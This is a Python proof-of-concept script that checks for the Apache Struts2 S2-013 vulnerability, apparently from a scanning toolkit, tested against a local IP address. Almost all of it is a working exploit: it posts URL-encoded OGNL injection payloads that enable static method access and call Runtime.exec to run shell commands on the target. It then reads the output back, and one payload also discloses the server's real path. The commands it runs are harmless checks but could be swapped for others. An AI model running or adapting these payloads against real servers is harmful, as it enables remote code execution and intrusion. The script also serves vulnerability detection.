import warnings
import requests
import secrets

warnings.filterwarnings("ignore")


def poc(url, **kwargs):
    if kwargs.get('ip'):
        url = 'http://' + kwargs.get('ip') + ':' + kwargs.get('port')
    else:
        url = url
    timeout = 10
    proxies = {'http': '127.0.0.1:9999'}
    ran_a = secrets.SystemRandom().randint(10000000, 20000000)
    ran_b = secrets.SystemRandom().randint(1000000, 2000000)
    ran_check = ran_a - ran_b
    check = [ran_check, '无法初始化设备 PRN', '??????? PRN', 'Struts2-vuln-Goop1116',
             'Unable to initialize device PRN']
    lin = 'expr' + ' ' + str(ran_a) + ' - ' + str(ran_b)
    poc_goop = [
        r'''a=1${(%23_memberAccess["allowStaticMethodAccess"]=true,%23a=@java.lang.Runtime@getRuntime().exec('print goop').getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[50000],%23c.read(%23d),%23sbtest=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23sbtest.println(%23d),%23sbtest.close())}''',
        r'''a=1${(%23_memberAccess["allowStaticMethodAccess"]=true,%23a=@java.lang.Runtime@getRuntime().exec("''' + lin + '''").getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[50000],%23c.read(%23d),%23sbtest=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23sbtest.println(%23d),%23sbtest.close())}''',
        r'a=1${(%23_memberAccess["allowStaticMethodAccess"]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23k8out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23k8out.print(%23req.getRealPath("Struts2-vuln-Goop")),%23k8out.println(1116),%23k8out.close())}'
    ]
    headers = {
        "Accept": "application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*",
        "User-Agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0',
        "Content-Type": "application/x-www-form-urlencoded"
    }
    try:
        for test in poc_goop:
            req = requests.post(url, data=test, headers=headers, timeout=timeout, verify=False, )
            result = "目标存在 Struts2-013, check url: %s" % url
            for c in check:
                if str(c) in req.text:
                    return result
    except:
        pass

if __name__ == '__main__':
    a = poc("http://192.168.106.130:8080/link.action")
    print(a)
